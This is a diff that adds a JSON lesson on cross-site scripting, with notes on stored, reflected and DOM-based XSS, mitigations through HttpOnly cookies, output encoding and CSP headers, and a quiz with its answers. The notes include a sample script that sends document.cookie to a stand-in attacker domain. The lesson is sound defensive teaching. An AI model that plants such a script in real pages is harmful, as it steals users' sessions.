@@ -1,0 +1,38 @@
+{
+  "title": "Mitigating Cross-Site Scripting (XSS)",
+  "description": "Understand Stored, Reflected, and DOM-based XSS vulnerabilities, exploit scenarios, and how to sanitize input parameters to protect sessions.",
+  "learningObjectives": [
+    "Differentiate between Stored and Reflected XSS.",
+    "Formulate an XSS attack vector that steals browser cookies.",
+    "Apply HTML sanitization and CSP (Content Security Policy) headers to mitigate scripting injections."
+  ],
+  "notes": "# Summary\nCross-Site Scripting (XSS) is a vulnerability where malicious scripts are injected into trusted web applications. These scripts execute within the context of the user's browser session, allowing access to session cookies, localStorage data, and private API keys.\n\n## Types of XSS Vulnerabilities\n- **Stored XSS (Persistent)**: Malicious scripts are stored permanently on server databases (e.g., inside forum comment feeds) and served to other users visiting the page.\n- **Reflected XSS (Non-Persistent)**: Malicious scripts are reflected off web servers via query parameters (e.g., search queries) in links, requiring the victim to click a link.\n- **DOM-based XSS**: Vulnerability lies purely in the client-side JavaScript code parsing user inputs and injecting them directly into the document layout without sanitization.\n\n$$\\text{Stored XSS: } \\text{Hacker} \\xrightarrow{\\text{Comment Vector}} \\text{Server DB} \\xrightarrow{\\text{Serve Page}} \\text{Victim Browser (Executes script)}$$\n\n---\n\n## Exploit Scenario: Session Hijacking\nIf an attacker can execute arbitrary script tags, they can fetch user credentials stored in cookies:\n\n```html\n<script>\n  // Steal session token and send to attacker log catcher\n  fetch('https://attacker-domain.com/log?cookie=' + document.cookie);\n</script>\n```\n\n---\n\n## Mitigating Injections\n\n### 1. HTTPOnly Cookies\nSet the `httpOnly: true` flag on all session cookies. This prevents JavaScript scripts from reading `document.cookie`, neutralizing session theft via XSS.\n\n### 2. Context-Aware Output Encoding\nEscape user inputs before rendering them on HTML pages. Replace special characters with safe HTML entities:\n- `<` becomes `&lt;`\n- `>` becomes `&gt;`\n\n### 3. Content Security Policy (CSP)\nSet HTTP response headers restricting where script tags can load code from:\n\n```http\nContent-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com;\n```",
+  "resources": [
+    {
+      "name": "OWASP XSS Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    }
+  ],
+  "quiz": [
+    {
+      "question": "Which cookie flag prevents client-side JavaScript code from accessing session tokens, preventing session hijackings?",
+      "options": [
+        "A) Secure",
+        "B) SameSite",
+        "C) HttpOnly",
+        "D) Domain"
+      ],
+      "answer": "C) HttpOnly"
+    },
+    {
+      "question": "What does a Content Security Policy (CSP) header primarily control?",
+      "options": [
+        "A) Encrypts server log files",
+        "B) Restricts source locations where scripts, stylesheets, and resources can load from",
+        "C) Automatically sanitizes SQL database statements",
+        "D) Bypasses firewall blocks"
+      ],
+      "answer": "B) Restricts source locations where scripts, stylesheets, and resources can load from"
+    }
+  ]
+}
